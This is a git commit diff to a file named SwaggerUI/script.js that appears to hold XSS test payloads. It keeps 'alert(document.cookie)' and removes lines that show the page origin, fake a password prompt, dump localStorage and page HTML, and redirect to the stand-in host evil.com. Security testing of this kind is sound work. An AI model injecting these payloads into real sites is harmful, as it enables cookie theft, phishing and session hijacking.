46f193d383c23f02845320c1eea743b7b9d80473
Rivek Raj Tamang <42813263+Rivek619@users.noreply.github.com>
2025-01-17 14:10:06 +0530

    Update script.js

--- SwaggerUI/script.js
+++ SwaggerUI/script.js
@@ -1,8 +1,1 @@
-alert(window.origin);
 alert(document.cookie);
-prompt('Enter your password:', '');
-alert(JSON.stringify(localStorage);
-alert(navigator.userAgent);
-alert(window.location='https://evil.com');
-alert(document.documentElement.outerHTML);
-javascript:alert(document.domain);
